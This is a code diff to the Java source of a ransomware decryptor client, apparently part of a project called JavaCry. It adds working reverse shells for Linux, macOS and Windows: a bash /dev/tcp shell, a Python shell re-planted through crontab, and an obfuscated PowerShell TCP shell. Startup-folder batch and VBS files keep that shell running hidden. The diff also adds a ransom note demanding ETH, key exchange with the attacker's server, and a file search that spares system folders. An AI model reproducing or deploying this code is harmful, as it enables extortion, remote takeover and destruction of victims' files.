@@ -17,18 +17,21 @@ import javax.crypto.KeyGenerator;
 import javax.crypto.SecretKey;
 import javax.crypto.spec.SecretKeySpec;
 import javax.crypto.spec.IvParameterSpec;
+import java.nio.charset.StandardCharsets;
 import java.util.Base64;
+import java.util.ArrayList;
 import java.util.stream.Stream;
 
 import java.security.*;
 import javax.crypto.BadPaddingException;
 import javax.crypto.IllegalBlockSizeException;
 import java.security.spec.PKCS8EncodedKeySpec;
+import java.security.spec.X509EncodedKeySpec;
+import java.security.spec.EncodedKeySpec;
 
 import java.applet.*;
 import java.io.File;
 import java.net.*;
-
 /*
    decryptor:
    BTC payment interface
@@ -36,9 +39,6 @@ import java.net.*;
    if receives the key, use the key to decrypt the files
    destroy decryptor.java
  */
-
-
-
 public class Decryptor {
   private static int id = 823780263;
 
@@ -49,6 +49,7 @@ public class Decryptor {
   private boolean usingRevShell = true;
   private int revPort = 9999;
   private boolean usePersistence = false;
+  private String CryptAddress = "[My Address]";
 
   // socket variables
   private Socket socket;
@@ -66,12 +67,14 @@ public class Decryptor {
 
   private ClientThread backend;
 
+  
+
   public void shell() {
     Thread thread = new Thread(){
       public void run(){
         Process p;
         try {
-          if (OS.equals("Linux") || OS.equals("Mac OS X")) {
+          if (OS.indexOf("Linux") >= 0 || OS.indexOf("Mac OS X") >= 0) {
             try {
               p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/" + address + "/" + revPort + " 0>&1");
             } catch (Exception e) {
@@ -88,22 +91,67 @@ public class Decryptor {
               p = Runtime.getRuntime().exec(cmd);
               BufferedReader b = new BufferedReader(new InputStreamReader(p.getInputStream()));
 
-                String str;
-
-                while ((str = b.readLine()) != null) {
-                    System.out.println(str);
-                }
-
-                b.close();
+              cmd = new String[]{
+                "/bin/sh",
+                "-c",
+                "echo \"* * * * * python3 -c \\\"socket=__import__('socket');os=__import__('os');pty=__import__('pty');s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('" + address + "', " + revPort + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')\\\"\" | crontab -"
+              };
+              p = Runtime.getRuntime().exec(cmd);
+              b = new BufferedReader(new InputStreamReader(p.getInputStream()));
                 System.out.println("persistence done");
             }
             
             System.out.println("linux execution");
-          } else if (OS.equals("Windows")) {
-            String cmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"" + address + "\"," + revPort + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";
+          } else if (OS.indexOf("Windows") >= 0) {
+            String payload = "$KLK = New-Object System.Net.Sockets.TCPClient('" + address + "','" + revPort + "');$PLP = $KLK.GetStream();[byte[]]$VVCCA = 0..((2-shl(3*5))-1)|%{0};$VVCCA = ([text.encoding]::UTF8).GetBytes(\"Succesfuly connected .`n`n\");$PLP.Write($VVCCA,0,$VVCCA.Length);$VVCCA = ([text.encoding]::UTF8).GetBytes((Get-Location).Path + ' > ');$PLP.Write($VVCCA,0,$VVCCA.Length);[byte[]]$VVCCA = 0..((2-shl(3*5))-1)|%{0};while(($A = $PLP.Read($VVCCA, 0, $VVCCA.Length)) -ne 0){;$DD = (New-Object System.Text.UTF8Encoding).GetString($VVCCA,0, $A);$VZZS = (i`eX $DD 2>&1 | Out-String );$HHHHHH  = $VZZS + (pwd).Path + '! ';$L = ([text.encoding]::UTF8).GetBytes($HHHHHH);$PLP.Write($L,0,$L.Length);$PLP.Flush()};$KLK.Close();";
+            
+            String username = System.getProperty("user.name");
+            File f = new File("C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\setup.ps1");
+
+            if (!f.exists()) {
+                f.createNewFile();
+            }
+            FileWriter writer = new FileWriter("C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\setup.ps1");
+
+            writer.write(payload);
+            writer.close();
+            String cmd = "powershell C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\setup.ps1";
+            System.out.println(cmd);
             p = Runtime.getRuntime().exec(cmd);
+            cmd = "start /B powershell.exe C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\setup.ps1";
             if (usePersistence) {
-              p = Runtime.getRuntime().exec("echo " + cmd + " > C:\\Users\\Rasta\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\backdoor.bat");
+
+              // backdoor runner
+
+              f = new File("C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\setup.bat");
+
+              if (!f.exists()) {
+                  f.createNewFile();
+              }
+              writer = new FileWriter("C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\setup.bat");
+              writer.write(cmd);
+              writer.close();
+
+              // window hider
+
+              f = new File("C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\configure.vbs");
+              if (!f.exists()) {
+                f.createNewFile();
+              }
+              writer = new FileWriter("C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\configure.vbs");
+              writer.write("CreateObject(\"Wscript.Shell\").Run \"C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\setup.bat\", 0, True");
+              writer.close();
+
+
+              // window hider runner
+
+              f = new File("C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\startup.bat");
+              if (!f.exists()) {
+                f.createNewFile();
+              }
+              writer = new FileWriter("C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\startup.bat");
+              writer.write("@echo off\nstart C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\configure.vbs  > nul 2> nul");
+              writer.close();
             }
 
           } else {
@@ -130,9 +178,9 @@ public class Decryptor {
     String note = String.join("\n", "<html>", "",
         "<h1 style = 'font-size: 32px; padding: 10px 10px; color: rgb(255,255,255);'>Your files have been encrypted.</h1>",
         "<p style = 'padding: 10px 10px;color: rgb(255,255,255);'>",
-        "Your files have been encrypted. If you want to decrypt your files, please copy the content of sendtome.txt send it with $1 ETH to [My Address]. You can follow this tutorial to send me money: https://www.youtube.com/watch?v=EwxPqbseFrE. I will check the payments before I approve your request for decryption.",
+        "Your files have been encrypted. If you want to decrypt your files, please copy the content of sendtome.txt send it with $1 ETH to " + CryptAddress + ". You can follow this tutorial to send me money: https://www.youtube.com/watch?v=EwxPqbseFrE. I will check the payments before I approve your request for decryption.",
         "</p>", "<p style = 'padding: 10px 10px;color: rgb(255,255,255);'>",
-        "<br><b>Don’t delete or modify any content in Key_protected.key, or you will lose your ability to decrypt your files.</b>",
+        "<br><b>Don’t delete or modify any content in Key_protected.key and public.key, or you will lose your ability to decrypt your files.</b>",
         "</p>", "<p style = 'padding: 10px 10px;color: rgb(255,255,255);'>",
         "<br>If you want to open this window again, please run Decryptor.jar.<br>", "</p>", "</html>");
 
@@ -215,6 +263,7 @@ class ClientThread extends Thread {
   private String state;
   private static String targetPath;
   private static java.util.List<Path> files = new ArrayList<Path>();
+  private static ArrayList<String> avoidDir = new ArrayList<String>();
   private String b64privkey;
   private PrivateKey private_key;
   private Cipher RSA_Cipher;
@@ -226,6 +275,28 @@ class ClientThread extends Thread {
   private JButton button;
   private int port;
   private int id;
+
+  public static void search(String path) throws Exception {
+    File root = new File(path);
+    File[] list = root.listFiles();
+
+    if(list == null) return;
+
+    for(File f: list) {
+        String name = f.getName();
+        if (f.isDirectory()) {
+            if (avoidDir.contains(name.toLowerCase())) return; //want system to still work
+            search(f.getAbsolutePath());
+
+        } else {
+            //split to get file extension
+            System.out.println(name);
+            if (!name.equals("JavaCry.jar")) {
+                files.add(f.toPath());
+            }
+        }
+    }
+  }
 
   public ClientThread(String address, int port, int id, JLabel status, JButton button, JLabel loading) {
     state = "<def>";
@@ -249,17 +320,42 @@ class ClientThread extends Thread {
 
   public void RequestForDecryption() {
     try {
+
       button.setEnabled(false);
       System.out.println("trying to connect");
       socket = new Socket(address, port);
       System.out.println("connected");
 
-      // sends output to the socket
       DataInputStream in = new DataInputStream(socket.getInputStream());
       DataOutputStream out = new DataOutputStream(socket.getOutputStream());
+      out.writeUTF("RequestForDecryption");
+      System.out.println("RequestForDecryption");
 
-      out.writeUTF(String.valueOf(id));
+      // prevent request forgery
+      String RFToken = in.readUTF();
+      System.out.println("read token");
+
+      // use the rsa for encrypting the AES key to encrypt ID to send it to the server
+      File pubFile = new File("public.key");
+      byte[] pubBytes = Files.readAllBytes(pubFile.toPath());
+      KeyFactory keyFactory = KeyFactory.getInstance("RSA");
+      EncodedKeySpec encryptSpec = new X509EncodedKeySpec(pubBytes);
+      PublicKey pubKey = keyFactory.generatePublic(encryptSpec);
+
+      Cipher cipher = Cipher.getInstance("RSA");
+      cipher.init(Cipher.ENCRYPT_MODE, pubKey);
+
+      byte[] idBytes = (String.valueOf(id) + "," + RFToken).getBytes(StandardCharsets.UTF_8);
+      byte[] encryptedID = cipher.doFinal(idBytes);
+      String encodedString = Base64.getEncoder().encodeToString(encryptedID);
+
+
+      out.writeUTF(encodedString);
+      System.out.println("write data");
+
+
       b64privkey = in.readUTF();
+      System.out.println("received key");
       System.out.println(b64privkey);
       if (b64privkey.equals("but I refuse")) {
         status.setText("Your request has been rejected.");
@@ -273,11 +369,33 @@ class ClientThread extends Thread {
 
       RSA_Cipher = Cipher.getInstance("RSA");
       AES_Cipher = Cipher.getInstance("AES");
-      try (Stream<Path> paths = Files.walk(Paths.get(targetPath))) {
-        files = paths.filter(Files::isRegularFile).collect(Collectors.toList());
-      } catch (Exception err) {
-        ;
+
+      avoidDir.add("windows");
+      avoidDir.add("library");
+      avoidDir.add("boot");
+      avoidDir.add("local");
+      avoidDir.add("program files");
+      avoidDir.add("programdata");
+      avoidDir.add("system");
+      avoidDir.add("volumes");
+      avoidDir.add("dev");
+      avoidDir.add("etc");
+      avoidDir.add("bin");
+      avoidDir.add("$");
+
+      try {
+        if (targetPath.equals("")) {
+            targetPath = System.getProperty("user.dir");
+        } else {
+            File f = new File(targetPath);
+            targetPath = f.getAbsolutePath();
+        }
+        System.out.println("Searching " + targetPath);
+        search(targetPath);
+      } catch (Exception e) {
+          System.out.println(e);
       }
+
       try {
         decryptFiles();
         status.setText("Your request has been accepted.");
